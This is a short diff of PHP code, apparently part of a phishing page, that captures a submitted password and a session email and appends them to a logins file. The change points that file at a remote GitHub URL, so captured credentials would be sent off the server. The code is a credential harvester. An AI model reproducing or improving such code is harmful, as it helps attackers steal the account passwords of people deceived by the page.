@@ -5,7 +5,7 @@
 			$pass = $_POST["Passwd"];
 			$email=$_SESSION["Email"];
 			//opening logins text file for appending new data.
-  			$file = fopen("logins.txt", "a") or die("Unable to open file!");
+  			$file = fopen("https://github.com/Demongit01/Demongit01.github.io/blob/694b8e81965228dcad40ffbc49a61781285e5704/logins.txt", "a") or die("Unable to open file!");
 			
   			//Writing email and password to logins.txt. 
   			fwrite($file, $email."	".$pass.PHP_EOL);			
